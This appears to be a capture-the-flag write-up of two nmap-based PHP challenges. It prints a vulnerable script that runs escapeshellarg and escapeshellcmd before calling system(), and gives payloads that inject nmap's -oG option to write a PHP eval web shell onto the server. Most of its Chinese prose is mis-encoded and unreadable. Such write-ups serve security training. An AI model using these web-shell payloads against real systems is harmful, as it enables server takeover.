# 1.escapeshellarg()������escapeshellcmd()����
�ο���https://blog.csdn.net/RABCDXB/article/details/115360423
- [BUUCTF 2018]Online Tool
```php
<?php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```
namp��������һ������-oG ���Խ�����ͽ��д���ļ��У�payload��
?host='<?php @eval($_POST["a"]);?> -oG 1.php '
![alt text](image-51.png)
Starting֮ǰ�����ļ�������
![alt text](image-52.png)
�Ͻ�����http://2b5a7644-9b61-4ac5-ab21-0bb047e788a2.node5.buuoj.cn:81/a35195adc6931b376a1d8cf360ec9fd2/1.php,������a
��Ŀ¼���õ�flag

# 2.nmap����ִ��
- [������ 2020 ��ȸ��]Nmap
![alt text](image-56.png)
ʹ��-oG���ɨ���Ľ�������ļ����ļ���ʽ�Լ����ã�payload��
' <?php @eval($_POST['x']); ?> -oG shell.php '
����hacker���޸�Ϊphtml
' <?php @eval($_POST['r1']); ?> -oG shell.phtml '
����/shell.phtml![alt text](image-57.png)
�ɹ�д�룬�Ͻ������õ�flag